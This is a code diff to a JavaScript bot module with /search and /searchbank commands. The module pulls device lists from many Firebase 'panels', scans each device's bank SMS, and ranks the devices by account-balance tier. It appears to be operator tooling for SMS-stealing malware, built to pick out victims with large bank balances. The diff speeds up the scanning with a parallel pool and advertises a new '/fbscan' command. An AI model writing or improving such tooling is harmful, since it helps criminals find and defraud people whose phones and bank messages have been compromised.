@@ -1,5 +1,6 @@
 import { fetchPanelDevices, normalizeFirebaseUrl } from './panelCore.mjs';
 import { processBankMessages, formatSmsWhen, devicePeakAmount } from './bankSms.mjs';
+import { mapPool } from './pool.mjs';
 
 const TIERS = {
   low_high: { min: 2_000, max: 50_000, label: 'BAL 2K–50K (bada→chota)', sort: 'desc' },
@@ -10,8 +11,8 @@ const TIERS = {
 };
 
 const SMS_LIMIT = { 1: 1200, 3: 1800, 7: 2200, 15: 2800, 30: 3200, 0: 4000 };
-const PANEL_BATCH = 40;
-const SMS_BATCH = 36;
+const PANEL_PARALLEL = 16;
+const SMS_BATCH = 28;
 
 export function parseSearchCommand(text) {
   const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
@@ -207,46 +208,35 @@ export async function runSearch(panels, opts, onProgress) {
   let panelsDone = 0;
   let devicesSmsDone = 0;
 
-  for (let i = 0; i < panels.length; i += PANEL_BATCH) {
-    const chunk = panels.slice(i, i + PANEL_BATCH);
-    const settled = await Promise.allSettled(chunk.map(p => fetchPanelDevices(p)));
-    const toScan = [];
-
-    for (let j = 0; j < settled.length; j++) {
-      panelsDone++;
-      const panel = chunk[j];
-      const r = settled[j];
-      if (r.status === 'fulfilled' && r.value?.length) {
-        panelsHit.add(panel.url.toLowerCase());
-        for (const d of r.value) {
-          if (devicePassesStatus(d, opts) && devicePassesPin(d, opts)) toScan.push(d);
-        }
-      }
+  await mapPool(panels, PANEL_PARALLEL, async panel => {
+    let devices = [];
+    try {
+      devices = await fetchPanelDevices(panel);
+    } catch {
+      devices = [];
     }
+    panelsDone++;
 
-    onProgress?.({
-      phase: 'run',
-      panelsDone,
-      panelsTotal: panels.length,
-      devices: devicesSmsDone + toScan.length,
-      matched: results.length,
-    });
+    if (devices.length) panelsHit.add(panel.url.toLowerCase());
+
+    const toScan = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
 
     for (let k = 0; k < toScan.length; k += SMS_BATCH) {
       const smsChunk = toScan.slice(k, k + SMS_BATCH);
       await Promise.all(smsChunk.map(d => scanDeviceSms(d, opts, tier, limit, results)));
       devicesSmsDone += smsChunk.length;
-      if (panelsDone % 80 === 0 || k + SMS_BATCH >= toScan.length) {
-        onProgress?.({
-          phase: 'run',
-          panelsDone,
-          panelsTotal: panels.length,
-          devices: devicesSmsDone,
-          matched: results.length,
-        });
-      }
     }
-  }
+
+    if (panelsDone % 20 === 0 || panelsDone === panels.length) {
+      onProgress?.({
+        phase: 'run',
+        panelsDone,
+        panelsTotal: panels.length,
+        devices: devicesSmsDone,
+        matched: results.length,
+      });
+    }
+  });
 
   const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
   filtered.sort((a, b) => {
@@ -296,6 +286,7 @@ export function searchHelpText() {
     '→ Low/High · ▶ Start\n\n' +
     'Quick (no taps): `/search avl/bal, bank online now`\n' +
     '🏦 `/searchbank`\n' +
+    '🔥 `/fbscan` — fast online report + valid TXT\n' +
     '/done = cancel'
   );
 }
